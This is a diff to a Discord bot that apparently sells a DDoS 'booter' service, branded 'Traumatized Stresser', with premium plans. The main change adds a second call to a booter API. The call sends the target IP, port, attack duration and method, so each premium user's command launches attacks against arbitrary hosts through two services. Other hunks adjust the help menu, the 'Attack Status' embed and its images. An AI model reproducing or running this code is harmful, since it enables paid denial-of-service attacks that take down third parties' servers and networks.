@@ -115,6 +115,10 @@ client.on('message', async (message) => {
             console.log(body);
             bootembed(ip, port, time, method, "True", extra.currentTime());
           });
+          fetch(config.BOOTERAPI1 + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+            let resp = body;
+            console.log(body);
+          });
         }
       } else {
         sendmsg("Error", "You aren't premium!");
@@ -139,7 +143,8 @@ client.on('message', async (message) => {
   } else if(message.content.startsWith(config.BotInfo.Prefix + "register")) {
       sendmsg("Register", crud.register(message.author.tag, message.author.id))
   } else if(message.content.startsWith(config.BotInfo.Prefix)) {
-      sendmsg("Error", "You aren't registered. In order to register type ``" + config.BotInfo.Prefix  + "register``");
+      sendmsg("Error", "You aren't registered")
+      //message.channel.send("Error, You aren't registered ");
   }
 
   function sendmsg(titlel, descriptionl) {
@@ -162,8 +167,7 @@ client.on('message', async (message) => {
 		  //{ name: '\u200B', value: '\u200B' },
         { name: 'Help | Command list', value: config.BotInfo.Prefix + 'help'},
 	    	{ name: 'GeoIP | IP Location', value: config.BotInfo.Prefix + 'geo <method(all/isp)> <ip>'},
-        { name: 'Port Scan | Grab open ports on a IP', value: config.BotInfo.Prefix + 'pscan <ip>'},
-        { name: 'Stress | Traumatized Stresser', value: config.BotInfo.Prefix + 'stress <ip> <port> <time> <method>'},
+	    	{ name: 'Port Scan | Grab open ports on a IP', value: config.BotInfo.Prefix + 'pscan <ip>'},
 	    	{ name: 'Prices | Bot plans and link to buy now!', value: config.BotInfo.Prefix + 'prices'},
 	    	{ name: 'Methods | List of methods for premium users', value: config.BotInfo.Prefix + 'methods'},
 	    	{ name: 'Bot Invite | Invite this bot to your server', value: config.BotInfo.Prefix + 'bot_inv'},
@@ -178,7 +182,7 @@ client.on('message', async (message) => {
 
   function bootembed(ip, p, t, m, status, timestamp) {
       const exampleEmbed = new Discord.MessageEmbed()
-	    .setColor('#0099ff')
+	    .setColor('#ff0000')
 	    .setTitle(config.BotInfo.Name + " | Attack Status")
 	    .addFields(
 		    // { name: 'Regular field title', value: 'Some value here' },
@@ -190,7 +194,7 @@ client.on('message', async (message) => {
 	    	{ name: 'Status', value: status, inline: true },
 	    	{ name: 'Timestamp', value: timestamp, inline: true },
     	)
-    	.setImage('https://media1.giphy.com/media/11Ad7FqUiNMRAA/giphy.gif')
+    	.setImage('https://thumbs.gfycat.com/AgileUnrulyAcaciarat-max-1mb.gif')
     	.setTimestamp()
     	.setFooter(config.BotInfo.Name + ` | Created & Developed By: Traumatized Security | Main Server: ` + config.BotInfo.Server_Invite, 'https://scrapy.tech/image0.png');
 
